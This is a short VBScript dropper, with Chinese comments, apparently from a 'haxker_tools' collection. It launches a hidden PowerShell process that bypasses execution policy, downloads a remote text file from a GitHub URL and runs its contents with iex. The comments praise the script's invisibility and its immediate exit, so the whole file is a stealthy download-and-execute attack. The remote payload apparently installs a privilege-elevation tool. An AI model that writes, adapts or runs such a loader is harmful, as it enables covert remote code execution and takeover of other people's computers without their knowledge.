Set objShell = CreateObject("WScript.Shell")

Dim remoteUrl, psCommand
remoteUrl = "https://raw.githubusercontent.com/brndan918/haxker_tools/refs/heads/main/hack_PC_cmd/add_gsudo.txt"

' 優化亮點：
' 1. 改用 -WindowStyle Hidden 確保全 Windows 版本完美隱形不閃爍
' 2. 在 iex 前面加上 [Console]::OutputEncoding 與 [System.Text.Encoding]::UTF8，防止文字檔內含中文時發生語系亂碼
psCommand = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command ""[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; iex ([System.Text.Encoding]::UTF8.GetString((Invoke-WebRequest -Uri '" & remoteUrl & "' -UseBasicParsing).Content))"""

' 0 代表完全隱藏視窗，False 代表丟出後 VBS 直接結束
objShell.Run psCommand, 0, False
